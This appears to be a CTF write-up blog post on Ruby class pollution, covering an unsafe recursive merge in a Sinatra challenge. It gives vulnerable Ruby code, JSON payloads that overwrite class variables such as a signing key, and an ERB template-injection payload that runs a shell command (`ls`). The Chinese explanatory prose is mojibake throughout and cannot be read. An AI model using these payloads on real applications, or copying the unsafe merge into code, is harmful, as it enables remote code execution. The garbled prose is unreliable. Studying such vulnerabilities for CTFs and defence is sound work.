<p><a target="_blank" rel="noopener" href="https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md">https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md</a></p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p>
<p>å¤§æ¦‚çš„æ€è·¯æ˜¯æ‰“ ruby ç±»æ±¡æŸ“ï¼Œå’ŒåŸå‹é“¾æ±¡æŸ“ç±»ä¼¼</p>
<p>é¦–å…ˆè¦äº†è§£ä¸€ä¸‹ ruby ç±»</p>
<h2 id="rubyç±»"><a href="#rubyç±»" class="headerlink" title="rubyç±»"></a>rubyç±»</h2><p>ruby ä¸­ä¸‡ç‰©çš†å¯¹è±¡ï¼Œå¯¹äºè¿™ä¸ª Person ç±»</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Person</span>
  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>

  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
    <span class="token variable">@age</span> <span class="token operator">=</span> age
    <span class="token variable">@details</span> <span class="token operator">=</span> details
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>
    <span class="token variable">@@url</span>
  <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>ç±»å˜é‡ï¼ˆç±»ä¼¼ Java ä¸­ç±»çš„é™æ€å˜é‡ï¼‰ä½¿ç”¨<code>@@</code>å‰ç¼€ï¼Œå¯ä»¥è·¨å¯¹è±¡ä½¿ç”¨</p>
</li>
<li><p>å®ä¾‹å˜é‡ä½¿ç”¨<code>@</code>å‰ç¼€ï¼Œåœ¨ç±»å†…éƒ¨ä½¿ç”¨<code>@</code>è¿›è¡Œè®¿é—®ï¼Œå¯ä»¥è·¨ä»»ä½•ç‰¹å®šçš„å®ä¾‹æˆ–å¯¹è±¡ä¸­çš„æ–¹æ³•ä½¿ç”¨</p>
</li>
<li><p><code>:</code>å‰ç¼€è¡¨ç¤ºç¬¦å·ï¼ˆsymbolï¼‰ï¼Œåœ¨ ruby ä¸­æ˜¯è½»é‡çº§ã€ä¸å¯å˜çš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºæ ‡è¯†ç¬¦ã€æ–¹æ³•åæˆ–é”®</p>
</li>
</ul>
<p>ruby å¯¹è±¡çš„ä¸€äº›ç‰¹æ®Šæ–¹æ³•ï¼š</p>
<ul>
<li><code>attr_accessor</code>ï¼šå®šä¹‰å®ä¾‹å˜é‡çš„ getter å’Œ setter æ–¹æ³•ï¼Œç”¨äºåœ¨ç±»å¤–éƒ¨è®¿é—®å®ä¾‹å˜é‡</li>
<li><code>initialize</code>ï¼šç±»çš„æ„é€ æ–¹æ³•</li>
<li><code>to_s</code>ï¼štoString æ–¹æ³•</li>
<li><code>inspect</code>ï¼šå’Œ <code>to_s</code> å·®ä¸å¤šï¼Œå¸¸ç”¨äºdebug</li>
<li><code>method_missing</code>ï¼šç±»ä¼¼PHPçš„<code>__call__</code>æ–¹æ³•ï¼Œå½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè§¦å‘</li>
<li><code>respond_to?</code>ï¼šæ£€æµ‹å¯¹è±¡æ˜¯å¦æœ‰æŸä¸ªæ–¹æ³•æˆ–å±æ€§</li>
<li><code>send</code>ï¼šæ ¹æ®æ–¹æ³•åæ¥è°ƒç”¨ï¼ˆåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼‰</li>
<li><code>public_send</code>ï¼šæ ¹æ®æ–¹æ³•åè°ƒç”¨å…¬å¼€æ–¹æ³•</li>
</ul>
<p>ruby å¯¹è±¡çš„ä¸€äº›ç‰¹æ®Šå±æ€§ï¼ˆç±»ä¹Ÿç®—å¯¹è±¡ï¼‰ï¼š</p>
<ul>
<li><code>class</code>ï¼šå½“å‰å¯¹è±¡çš„ç±»</li>
<li><code>superclass</code>ï¼šçˆ¶ç±»</li>
<li><code>subclasses</code>ï¼šå­ç±»æ•°ç»„</li>
<li><code>instance_variables</code>ï¼šå®ä¾‹å˜é‡åçš„æ•°ç»„</li>
<li><code>class_variables</code>ï¼šç±»å˜é‡åçš„æ•°ç»„</li>
</ul>
<p>åœ¨ Ruby ä¸­ï¼Œæ‰€æœ‰ç±»çš„é¡¶å±‚çˆ¶ç±»æ˜¯ BasicObjectã€‚BasicObject æ˜¯ Ruby ç±»å±‚æ¬¡ç»“æ„ä¸­çš„æ ¹ç±»ï¼Œæ‰€æœ‰å…¶ä»–ç±»éƒ½ç›´æ¥æˆ–é—´æ¥åœ°ç»§æ‰¿è‡ªå®ƒ</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322085041341.png" alt="image-20250322085041341"></p>
<h2 id="ç±»æ±¡æŸ“"><a href="#ç±»æ±¡æŸ“" class="headerlink" title="ç±»æ±¡æŸ“"></a>ç±»æ±¡æŸ“</h2><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>
  additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>
    <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>
      <span class="token keyword">else</span>
        new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>
        current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>
        current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
      <span class="token keyword">end</span>
    <span class="token keyword">else</span>
      current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
      current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
  original
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œå°±æ˜¯ä¸å®‰å…¨çš„ merge æ“ä½œï¼Œ<code>current_obj.instance_variable_set</code>ä¼šç›´æ¥åœ¨<code>current_obj</code>ä¸Šè®¾ç½®å®ä¾‹å˜é‡</p>
<p>ä¹Ÿå°±æ˜¯è¯´èƒ½éšæ„æ±¡æŸ“ä»»æ„å¯¹è±¡&#x2F;ç±»çš„å®ä¾‹å˜é‡</p>
<h3 id="æ±¡æŸ“å½“å‰å¯¹è±¡"><a href="#æ±¡æŸ“å½“å‰å¯¹è±¡" class="headerlink" title="æ±¡æŸ“å½“å‰å¯¹è±¡"></a>æ±¡æŸ“å½“å‰å¯¹è±¡</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Person</span>
  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>

  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
    <span class="token variable">@age</span> <span class="token operator">=</span> age
    <span class="token variable">@details</span> <span class="token operator">=</span> details
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>
    <span class="token variable">@@url</span>
  <span class="token keyword">end</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>
    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>
    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>
      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>
        <span class="token keyword">else</span>
          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">else</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
        <span class="token keyword">else</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    original
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œçš„ merge_with æ˜¯ Person ç±»ä¸‹çš„æ–¹æ³•ï¼Œè¯•å›¾æ±¡æŸ“åœ¨åŒä¸€ä¸ªç±»ä¸‹çš„<code>@@url</code></p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322090734947.png" alt="image-20250322090734947"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨<code>&#123;&quot;class&quot;:&#123;&quot;url&quot;:&quot;https://c1oudfl0w0.github.io/blog/&quot;&#125;&#125;</code>æˆåŠŸæ±¡æŸ“äº†å¯¹è±¡aåŒä¸€ä¸ª Person ç±»ä¸‹çš„ url å±æ€§</p>
<hr>
<h3 id="æ±¡æŸ“çˆ¶ç±»"><a href="#æ±¡æŸ“çˆ¶ç±»" class="headerlink" title="æ±¡æŸ“çˆ¶ç±»"></a>æ±¡æŸ“çˆ¶ç±»</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œ User ç±»ç»§æ‰¿äº† Personï¼Œæ˜¯ Person ç±»çš„å­ç±»</p>
<p>è¿™ç§æƒ…å†µä¹Ÿå¯ä»¥æ±¡æŸ“çˆ¶ç±» Person çš„ <code>@@url</code> å˜é‡ï¼Œä½†è¿™é‡Œå®é™…ä¸Šæ˜¯ç»™çˆ¶ç±» Person å¢åŠ äº†ä¸€ä¸ªå®ä¾‹å˜é‡ <code>@url</code>ï¼Œé€šè¿‡ Person.url è®¿é—®æ—¶ï¼Œå®ä¾‹å˜é‡ <code>@url</code> è¦†ç›–äº†ç±»å˜é‡ <code>@@url</code></p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322092508180.png" alt="image-20250322092508180"></p>
<p>è¿™é‡Œä½¿ç”¨<code>&#123;&quot;class&quot;:&#123;&quot;superclass&quot;:&#123;&quot;url&quot;:&quot;https://example.com/&quot;&#125;&#125;&#125;</code>æ¥æ±¡æŸ“</p>
<hr>
<h3 id="æ±¡æŸ“å…¶ä»–ç±»"><a href="#æ±¡æŸ“å…¶ä»–ç±»" class="headerlink" title="æ±¡æŸ“å…¶ä»–ç±»"></a>æ±¡æŸ“å…¶ä»–ç±»</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">KeySigner</span>
  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>
    <span class="token variable">@@signing_key</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°è¯•åœ¨ User ç±»æ±¡æŸ“åˆ° Keysigner ç±»çš„ signing_key</p>
<p>å‰é¢æè¿‡ï¼Œruby ä¸­æ‰€æœ‰ç±»éƒ½æ˜¯ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿ BasicObject  ç±»çš„ï¼Œè€Œè¿™é‡Œåˆ›å»ºçš„ç±»éƒ½æ˜¯ç»§æ‰¿ BasicObject ä¸‹çš„ Object ç±»</p>
<p>é‚£ä¹ˆå¯ä»¥å…ˆç”¨<code>superclass</code>è·å–çˆ¶ç±» Objectï¼Œç„¶åå†ç”¨<code>subclasses</code>è·å– Object ä¸‹çš„ Keysignerï¼Œä»è€Œå®ç°æ±¡æŸ“ signing_key</p>
<p>æ³¨æ„ subclasses è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œéœ€è¦ä½¿ç”¨æŒ‡å®šçš„ä¸‹æ ‡è®¿é—®</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322093528521.png" alt="image-20250322093528521"></p>
<p>é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œjson æ ¼å¼ä¸‹æ˜¯æ²¡æœ‰æ•°ç»„ä¸‹æ ‡è¿™ä¸€è¯´çš„</p>
<blockquote>
<p><code>Array.sample()</code>ï¼šä» Array å®ä¾‹çš„å…ƒç´ ä¸­é€‰æ‹©ä¸€ä¸ªéšæœºå¯¹è±¡</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>subclasses.sample</code> æ¥è·å–ä»»æ„ç±»</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322093905300.png" alt="image-20250322093905300"></p>
<p>å¦‚æœæƒ³è¦æ±¡æŸ“ç‰¹å®šçš„ç±»çš„è¯å°±éœ€è¦çˆ†ç ´ï¼Œé€šè¿‡å¤šæ¬¡æ±¡æŸ“ï¼Œæ€»æœ‰å‡ ç‡æ±¡æŸ“åˆ°<code>Keysigner</code>è¿™ä¸ªå­ç±»</p>
<p>payloadï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"signing_key"</span><span class="token operator">:</span><span class="token string">"injected-signing-key"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Sinatraä¸‹çš„ç±»æ±¡æŸ“"><a href="#Sinatraä¸‹çš„ç±»æ±¡æŸ“" class="headerlink" title="Sinatraä¸‹çš„ç±»æ±¡æŸ“"></a>Sinatraä¸‹çš„ç±»æ±¡æŸ“</h2><p>å›åˆ°é¢˜ç›®</p>
<p>å¼€å¤´è¿™ä¸ª<code># frozen_string_literal: true</code>ä¼šå†»ç»“æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡</p>
<p>è§‚å¯Ÿä¸€ä¸‹å’Œ Doyensec çš„æ–‡ç« ä¸ä¸€æ ·æ”¹åŠ¨çš„åœ°æ–¹</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>


<span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url
    response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆå°±æ˜¯banäº†åæ–œæ å’Œ<code>h</code>ï¼ŒåŒæ—¶ curl æ— å›æ˜¾</p>
<p>è°ƒè¯•å‘ç°ï¼Œ<code>JSON.parse</code> è¿™é‡Œå¯ä»¥æ­£ç¡®è§£æ unicode ç¼–ç ï¼Œä¸è¿‡<code>\</code>è¢« ban äº†ä¹Ÿç”¨ä¸äº†</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322094529423.png" alt="image-20250322094529423"></p>
<p>æ€è·¯æ˜¯åœ¨ JSONMergerApp é‡Œæ‰¾ä¸€ä¸ªèƒ½æ±¡æŸ“çš„å±æ€§æ¥å®ç°ç±»ä¼¼äº é™æ€æ–‡ä»¶è¯»å– æˆ–è€… getshell</p>
<h3 id="å†™erbæ¨¡æ¿"><a href="#å†™erbæ¨¡æ¿" class="headerlink" title="å†™erbæ¨¡æ¿"></a>å†™erbæ¨¡æ¿</h3><p>ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ”¾åœ¨ JSONMergerApp ç±»ä¸Š</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322100432299.png" alt="image-20250322100432299"></p>
<p>JSONMergerApp ç±»ä¸‹æœ‰ templates å±æ€§ï¼ŒçŒœæµ‹æ˜¯å­˜æ”¾æ¨¡æ¿çš„ï¼Œè·Ÿè¿›åˆ°çˆ¶ç±» Sinatra::Base çœ‹ä¸‹æºç </p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250322101857730.png" alt="image-20250322101857730"></p>
<p>åˆ° template è¿™é‡Œï¼Œè·Ÿè¿› compile_template</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323105531679.png" alt="image-20250323105531679"></p>
<p>è¿™é‡Œä¼šè·å– settings.templates çš„ bodyï¼Œå³è¦æ¸²æŸ“çš„ä»£ç ï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥æ¸²æŸ“</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323105820901.png" alt="image-20250323105820901"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ settings æ˜¯ä¸€ä¸ª JSONMergerApp å¯¹è±¡ï¼Œè€Œ data çš„å€¼æ˜¯ helloï¼Œä½†æ˜¯ settings.templates æ˜¯ç©ºå“ˆå¸Œ</p>
<p>å°è¯•ç›´æ¥ç»™å®ƒèµ‹å€¼ï¼š</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323113908404.png" alt="image-20250323113908404"></p>
<p>æ­¤æ—¶å‘ç°é¡µé¢å›æ˜¾å˜æˆ aaa äº†ï¼Œè¯´æ˜éœ€è¦æ§åˆ¶çš„å°±æ˜¯è¿™ä¸ª templates</p>
<p>åŒç†å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">JSONMergerApp<span class="token punctuation">.</span>set <span class="token symbol">:templates</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"hello"</span></span><span class="token symbol">:"&lt;%= `ls` %>"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323114210012.png" alt="image-20250323114210012"></p>
<p>é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å°è¯•æ±¡æŸ“ hello æ¨¡æ¿</p>
<p>payloadï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"templates"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"hello"</span><span class="token operator">:</span> <span class="token string">"&lt;%= `ls` %>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½†æ˜¯åŸé¢˜ä¸­è¿‡æ»¤äº† <code>h</code> å’Œ <code>\</code>ï¼Œæµ‹äº†ä¸€ä¸‹ç»•ä¸è¿‡å» :(</p>
<hr>
<h3 id="è®¾ç½®é™æ€ç›®å½•"><a href="#è®¾ç½®é™æ€ç›®å½•" class="headerlink" title="è®¾ç½®é™æ€ç›®å½•"></a>è®¾ç½®é™æ€ç›®å½•</h3><p>åœ¨ Sinatra ä¸­ä½¿ç”¨å¦‚ä¸‹é…ç½®æ¥è®¾ç½®é™æ€ç›®å½•</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/static'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯¹åº”æºç ä¸­çš„æ“ä½œï¼š</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323115154000.png" alt="image-20250323115154000"></p>
<p>é»˜è®¤çš„é™æ€ç›®å½•æ˜¯ publicï¼Œå…¶ç›®å½•ä¸‹çš„é™æ€èµ„æºç›´æ¥è®¿é—®å…¶æ–‡ä»¶åå³å¯è·å–</p>
